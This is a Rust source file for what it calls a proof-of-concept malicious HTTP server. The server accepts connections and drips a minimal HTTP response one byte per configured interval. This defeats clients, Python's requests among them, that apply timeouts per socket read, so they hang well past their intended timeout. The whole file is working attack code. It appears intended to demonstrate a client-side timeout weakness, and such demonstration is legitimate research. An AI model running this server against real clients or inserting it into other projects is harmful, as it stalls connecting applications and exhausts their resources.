use clap::Parser;
use std::{net::SocketAddr, time::Duration};
use tokio::{
    io::AsyncWriteExt,
    net::{TcpListener, TcpStream},
};

#[derive(Parser, Debug)]
#[clap(long_about = r#"
A proof-of-concept malicious HTTP server that only writes 
data to the underlying socket at a fixed interval to exploit 
HTTP clients that delegate request timeouts to the socket. For example,
Python's requests."#)]
struct Args {
    /// The interval (in seconds) to wait between writing individual bytes to the underlying socket.
    #[clap(
        long,
        short,
        help = "The interval (in seconds) to wait between writing individual bytes to the underlying socket."
    )]
    interval: f64,
    #[clap(long, short, help = "The port to start the server on.")]
    port: u16,
}

async fn handle_connection(mut stream: TcpStream, peer: SocketAddr, duration: Duration) {
    eprintln!("peer connected: {}", peer);

    let response = b"HTTP/1.1 200 OK\r\n\r\n";
    println!(
        "[ETA {:.3}s] Writing {} bytes to peer {} at the rate of 1 byte per {:#?}",
        duration.mul_f32(response.len() as f32).as_secs_f32(),
        response.len(),
        peer,
        duration
    );

    for idx in 0..response.len() {
        let buffer = response[idx..idx + 1].to_vec();
        let Ok(()) = stream.write_all(&buffer).await else {
            return;
        };
        if (idx + 1) % 5 == 0 {
            eprintln!("wrote {} bytes to peer: {}", idx + 1, peer);
        }
        tokio::time::sleep(duration).await;
    }
    stream.shutdown().await.unwrap();
    eprintln!("peer disconnected: {}", peer);
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let listener =
        TcpListener::bind(format!("0.0.0.0:{}", args.port).parse::<SocketAddr>()?).await?;

    while let Ok((stream, peer)) = listener.accept().await {
        tokio::task::spawn(handle_connection(
            stream,
            peer,
            Duration::from_secs_f64(args.interval),
        ));
    }

    Ok(())
}
